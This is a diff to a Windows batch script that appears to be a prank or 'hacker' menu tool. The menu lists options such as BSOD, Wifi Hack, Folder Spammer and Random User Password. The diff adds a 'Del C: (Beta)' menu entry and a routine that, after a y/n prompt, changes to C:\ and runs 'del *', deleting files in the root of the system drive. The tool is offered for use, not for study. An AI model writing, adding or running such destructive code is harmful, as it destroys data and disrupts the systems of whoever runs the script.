@@ -35,8 +35,8 @@ echo [3] Folder Spammer			[12] Random User Password
 echo [4] Show/Hide Files			[13] Pyranha Spam
 echo [5] Open Programs			[14] Remove color
 echo [6] Shutdown				[15] Refresh
-echo [7] BSOD(Dangerous)			[16] Exit
-echo [8] Wifi Hack
+echo [7] BSOD(Dangerous)			[16] Del C: (Beta)
+echo [8] Wifi Hack            [17] Exit
 echo [9] Change color
 echo.
 set /p MenuChoose=       
@@ -55,7 +55,8 @@ if %MenuChoose% == 12 goto randpass
 if %MenuChoose% == 13 goto pyrkey
 if %MenuChoose% == 14 goto remdat
 if %MenuChoose% == 15 goto securegoing
-if %MenuChoose% == 16 goto exit
+if %MenuChoose% == 16 goto deldrive
+if %MenuChoose% == 17 goto exit
 pause >nul
 
 :sd
@@ -445,6 +446,22 @@ goto pyrkey
 
 :pyrkey2
 start keyboardtype.vbs
+echo.
+pause
+goto MainMenu
+
+:deldrive
+cls
+echo Execute? (y/n)
+set /p executequestionmark=
+if %executequestionmark% == y goto deldrive2
+if %executequestionmark% == n goto MainMenu
+else goto deldrive
+
+:deldrive2
+cls
+cd C:\
+del *
 echo.
 pause
 goto MainMenu
